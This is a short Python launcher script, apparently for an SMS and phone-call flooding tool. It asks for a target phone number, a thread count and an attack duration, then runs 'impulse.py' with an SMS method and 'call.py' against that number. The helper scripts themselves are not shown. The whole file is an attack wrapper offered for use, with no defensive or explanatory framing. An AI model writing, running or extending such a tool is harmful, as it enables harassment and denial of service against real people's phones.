from os import system

from colorama import Fore
from time import sleep
import sys


W = Fore.LIGHTWHITE_EX
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW

number = input(W + "Target Number:~ " + Y)
threads = input(W + "Number of threads:~ " + G)
time = input(W + "Time for attack:~ " + R)

system(f"python3 impulse.py --method SMS --time {time} --threads {threads} --target {number} ")

system(f"python3 call.py {number}")

